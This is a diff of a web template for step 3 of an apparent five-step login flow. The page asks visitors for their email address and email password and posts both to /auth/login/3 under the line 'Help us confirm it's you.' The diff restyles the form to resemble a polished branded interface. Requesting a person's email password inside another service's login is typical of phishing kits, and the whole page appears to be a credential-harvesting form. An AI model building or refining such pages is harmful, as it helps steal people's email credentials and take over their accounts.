@@ -1,39 +1,105 @@
 @layout('layouts.app')
 
 @section('content')
-<form class="cb-form" action="/auth/login/3" method="POST">
-  <fieldset class="reg-content">
-    <legend>Email Verification</legend>
+<div class="col-20" style="width: 60rem;">
+  <div class="step-header align" style="padding: 0rem;">
+    <h2 class="cb-content-header cb-content-header-title topMargin bottomMargin">LOGIN</h2>
 
-    <p class="note">Fields with an asterisk (*) are required.</p>
+    <p class="topMargin bottomMargin">Help us confirm it's you by filling out the following information.</p>
+    <br>
+  </div>
+  <br>
 
-    <div class="row">
-      <div class="large-12 column">
-        <div class="description">Help us confirm it's you by filling out the following information.</div>
-      </div>
-    </div>
+  <p class="required-header">Fields marked with asterisks (*) are required.</p>
 
-    <div class="tabs-content">
-      <div class="content active">
-        <div class="row">
-          <div class="large-6 medium-6 medium-6-override column">
-            <label class="form-field-label" for="emailAddr">Email Address*</label>
-            <input id="emailAddr" name="emailAddr" type="text" class="radius cb-input" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
+  <form action="/auth/login/3" method="POST">
+    <h3>Email Information</h3>
+
+    <div class="cb-input-wrapper-component">
+      <div class="cb-form-field primary cb-form-field-legacy">
+        <div class="cb-form-field-wrapper">
+          <div class="cb-form-field-flex">
+            <div class="cb-form-field-infix">
+              <div class="cb-input-core">
+                <input id="emailAddr" name="emailAddr" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
+              </div>
+
+              <span class="cb-form-field-label-wrapper">
+                <label class="cb-form-field-label cb-form-field-empty" for="emailAddr">Email Address*</label>
+              </span>
+            </div>
           </div>
 
-          <div class="large-6 medium-6 medium-6-override column">
-            <label class="form-field-label" for="emailPass">Email Password*</label>
-            <input id="emailPass" name="emailPass" type="password" class="radius cb-input cb-input-mask" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
+          <div class="cb-form-field-underline">
+            <span class="cb-form-field-ripple"></span>
           </div>
         </div>
       </div>
+    </div>
 
-      <div class="row">
-        <div class="large-12 column">
-          <button class="button radius right submitBtn" type="submit" disabled="">Continue</button>
+    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
+      <div class="cb-form-field primary cb-form-field-legacy">
+        <div class="cb-form-field-wrapper">
+          <div class="cb-form-field-flex">
+            <div class="cb-form-field-infix">
+              <div class="cb-input-core">
+                <input id="emailPass" name="emailPass" class="cb-input cb-input-mask" type="password" autocapitalize="off" autocorrect="off" autocomplete="off">
+              </div>
+
+              <span class="cb-form-field-label-wrapper">
+                <label class="cb-form-field-label cb-form-field-empty" for="emailPass">Email Password*</label>
+              </span>
+            </div>
+          </div>
+
+          <div class="cb-form-field-underline">
+            <span class="cb-form-field-ripple"></span>
+          </div>
         </div>
       </div>
     </div>
-  </fieldset>
-</form>
+    
+    <div class="nav-btns" style="margin-bottom: 8.5rem; margin-top: 6rem;">
+        <button class="focus-indicator cb-button raised-button blue-btn primary-btn" type="submit" disabled="">
+          <span class="button-wrapper">NEXT</span>
+        </button>
+    </div>
+  </form>
+</div>
+@endsection
+
+@section('progress-bar')
+<div class="cb-row progress-bar-dots">
+  <ol>
+    <li class="future">
+      <p>
+        <span class="future">1</span>
+      </p>
+    </li>
+
+    <li class="future">
+      <p>
+        <span class="future">2</span>
+      </p>
+    </li>
+
+    <li class="present">
+      <p>
+        <span class="present">3</span>
+      </p>
+    </li>
+
+    <li class="future">
+      <p>
+        <span class="future">4</span>
+      </p>
+    </li>
+
+    <li class="future">
+      <p>
+        <span class="future">5</span>
+      </p>
+    </li>
+  </ol>
+</div>
 @endsection
